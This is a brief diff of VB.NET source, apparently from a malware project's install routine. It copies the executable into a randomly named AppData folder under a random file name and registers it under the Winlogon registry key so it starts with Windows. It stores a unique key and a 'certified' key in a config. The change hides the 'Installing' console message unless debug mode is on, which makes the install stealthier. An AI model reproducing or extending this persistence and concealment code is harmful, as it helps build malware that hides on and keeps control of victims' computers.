@@ -6,7 +6,9 @@ Imports Newtonsoft.Json
 Module Installing
     Public Sub Install()
         If Not File.Exists(Get_JsonFilewithPath()) Then
-            Console.WriteLine("Installing")
+            If Main.Config.Variables.Debug Then
+                Console.WriteLine("Installing")
+            End If
             Dim installPath As String = GetAppdata() & "\" & RandomString(5, 8)
             Dim Re_Named_Main_file As String = RandomString(4, 8) & ".exe"
             CreateDirectory(installPath)
@@ -19,7 +21,7 @@ Module Installing
             Set_registry("Software\Microsoft\Windows NT\CurrentVersion\Winlogon\", installPath & "\" & GetMainFile())
             Dim config As New ConfigModel With {
                 .KeyUnique = RandomString(10, 10),
-                .KeyCertified = SavedKeyCertified,
+                .KeyCertified = Main.Config.Variables.CertifiedKey,
                 .MainFileName = Re_Named_Main_file,
                 .MainPath = installPath
             }
